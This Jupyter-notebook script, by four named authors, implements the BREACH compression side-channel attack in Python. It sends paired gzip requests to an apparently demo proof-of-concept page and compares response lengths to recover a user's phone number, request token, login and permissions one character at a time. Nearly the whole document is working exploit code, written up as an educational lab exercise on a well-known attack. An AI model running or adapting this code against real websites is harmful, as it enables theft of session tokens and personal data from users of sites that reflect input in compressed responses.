#!/usr/bin/env python
# coding: utf-8

# # BREACH Implementation

# ### Authors

# * Miguel Enrile
# * Pedro Murcia
# * Luis Puyol
# * Iñigo Sagredo

# This is a BREACH attack implementation in Python. It is not as optimized as it should be, but I wouldn't dare touch anything.
# The attack is fully detailed in the following URL: http://breachattack.com/resources/BREACH%20-%20SSL,%20gone%20in%2030%20seconds.pdf
# 
# For this implementation, we will only use the *Huffman Coding and the Two-Tries Method* shown in the paper above to deduce the value of different variables.

# In[ ]:


import requests
import string
from datetime import datetime


# These are the target elements we want to hack. Each dictionary contains the name of the parameter and the format of the parameter, which is a string of possible characters.
# If the number of possibilities is lower, it will take less time to finish. All of them should technically work, but the first two have been tested and validated.

# In[ ]:


targets = [
    {
        "name": "user_phone",
        "format": string.digits
    },
    {
        "name": "request_token",
        "format": string.digits + string.ascii_lowercase[0:6]
    },
    {
        "name": "cu_public_name",
        "format": string.ascii_letters + " "
    },
    {
        "name": "user_login",
        "format": string.ascii_lowercase + "@."
    },
    {
        "name": "permissions",
        "format": string.ascii_letters + string.punctuation + string.digits + " "
    }
]


# The following header must be added to the request to be able to exploit GZIP on the response.

# In[ ]:


gzip_header = {'Accept-Encoding': 'gzip, deflate'}


# We will also keep track of the number of requests done.

# In[ ]:


total_requests = 0


# In JavaScript, there are different ways to assign a value to a variable.
# 1. **Number**. It will start with 0,1,2,3,4,5,6,7,8, or 9
# 2. **String**. It will start with `'` or `"`
# 3. **Object**. As JSON notation, `{}`
# 4. **Array**. As JSON notation, `[]`
# 5. **Boolean**. It has only two values, `true` or `false`
# 6. **Null value**. Represented as `null`
# 
# There are other types of assignments ($, variable name, or by object creation with `new`), but we will assume that those are the possible values.
# 
# So the possible start characters are defined in a list. We will focus on the first four, since those provide more information.

# In[ ]:


first_chars = ['\'','"','{','[','t','f','n'] + list(string.digits)


# The function `checkGuess()` will make requests to the website using the *Two-Tries Method* from before. After that, we will read the response content length,
# and we will have a candidate if both lengths are different.

# In[ ]:


def checkGuess(target, guess, padding):
    r_1 = requests.get(f"http://malbot.net/poc/?id={target}={padding}{guess}", headers=gzip_header)
    l_1 = int(r_1.headers['Content-Length'])
    
    global total_requests
    total_requests = total_requests + 1
    
    r_2 = requests.get(f"http://malbot.net/poc/?id={target}={guess}{padding}", headers=gzip_header)
    l_2 = int(r_2.headers['Content-Length'])
    
    total_requests = total_requests + 1
    
    return {
        'diff': l_1 != l_2,
        'guess': guess,
        'min': min(l_1,l_2),
        'd': abs(l_1-l_2)
    }


# The function `getGuesses()` will find the best options for the next character of the target string. In this case, the best options will be valid guesses
# (both response content lengths are different) whose minimum content length is the minimum of all guesses.

# In[ ]:


def getGuesses(target, chars, padding, guess = ''):
    # Finding by two-tries method
    result = map(lambda c: checkGuess(target, guess + c, padding), chars)
    
    # Filtering by those whose two tries return different content lengths
    result = [g for g in result if g['diff']]
    
    # Get those with the least content length
    minimum = min([d['min'] for d in result])
    result = [d for d in result if d['min'] == minimum]

    return result


# `getEndChar` is just a switch-case to determine the last character of the target value.

# In[ ]:


def getEndChar(begin_char):
    if begin_char in ['\'','"']:
        return begin_char
    elif begin_char == '{':
        return '}'
    elif begin_char == '[':
        return ']'
    elif begin_char in ['t','f']:
        return 'e'
    elif begin_char == 'n':
        return 'l'
    elif begin_char in list(string.digits):
        return ','


# And finally, `findTarget()` is the responsible of iterating through all of the guesses to get the most likely result.

# In[ ]:


def findTarget(target, char_seq):
    guesses = getGuesses(target, first_chars, "{}")

    last_char = None
    curr_char = ''

    chars = char_seq + ''.join([getEndChar(g['guess']) for g in guesses])

    while last_char != curr_char:
        tmp_guesses = []
        # Get guesses for each guess
        for guess in guesses:
            guesses_aux = getGuesses(target, chars, "{}", guess['guess'])
            tmp_guesses.extend(guesses_aux)

        # Filter those with less content length
        min_length = min([d['min'] for d in tmp_guesses])
        result = [d for d in tmp_guesses if d['min'] == min_length]

        if len(result) == 1:
            curr_char = result[0]['guess'][-1:]
            first_char = result[0]['guess'][0]
            last_char = last_char if last_char else getEndChar(first_char)
            chars = char_seq + last_char
        
        guesses = result
    
    return guesses


# With all of that, we are ready to test the algorithm.

# In[ ]:


for target in targets:
    name = target['name']
    format_t = target['format']
    
    print("=================================================================================")
    print(f"Finding value of {name}...")
    
    before = datetime.now()
    
    guess = findTarget(name,format_t)
    guessed_value = guess[0]['guess']
    
    after = datetime.now()
    
    d = after-before
    total = d.total_seconds()
    minutes = total // 60
    seconds = total - minutes * 60

    print(f"Guessed value of {name}: {guessed_value}")
    print(f"Total number of requests: {total_requests}")
    print(f"Time elapsed: {minutes} min {seconds} s")
    
    total_requests = 0


# In[ ]:




